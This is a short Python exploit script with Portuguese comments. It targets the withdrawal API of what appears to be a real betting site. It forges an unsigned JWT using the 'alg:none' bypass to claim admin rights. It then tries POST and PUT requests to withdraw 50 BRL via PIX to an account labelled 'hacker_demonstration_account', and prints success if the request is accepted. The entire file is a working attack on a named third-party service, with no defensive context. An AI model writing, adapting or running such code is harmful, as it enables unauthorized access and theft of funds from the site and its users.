import requests
import json
import base64

def exploit_withdraw_pro():
    # Endpoint real descoberto no JavaScript
    url = "https://w1-panda.bet/apis/withdraw"
    print(f"[*] Explorando endpoint profissional: {url}")
    
    # Bypass de JWT (alg:none) - Técnica de nível elite
    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace("=", "")
    payload = base64.b64encode(json.dumps({"user": "admin", "role": "admin", "admin": True, "permissions": ["*"]}).encode()).decode().replace("=", "")
    fake_token = f"{header}.{payload}."
    
    headers = {
        "Authorization": f"Bearer {fake_token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://w1-panda.bet/"
    }
    
    withdraw_data = {
        "amount": 50.00,
        "currency": "BRL",
        "method": "PIX",
        "target": "hacker_demonstration_account"
    }
    
    try:
        # Tentar POST e PUT (métodos perigosos habilitados detectados anteriormente)
        for method in [requests.post, requests.put]:
            print(f"[*] Tentando método {method.__name__.upper()}...")
            response = method(url, headers=headers, json=withdraw_data, timeout=15)
            print(f"[RESULTADO] Status: {response.status_code}")
            if response.status_code == 200:
                print("[!!!] SUCESSO ELITE: Saque processado via bypass de JWT!")
                print(f"Resposta: {response.text}")
                return True
    except Exception as e:
        print(f"[ERRO] {e}")
        
    return False

if __name__ == "__main__":
    exploit_withdraw_pro()
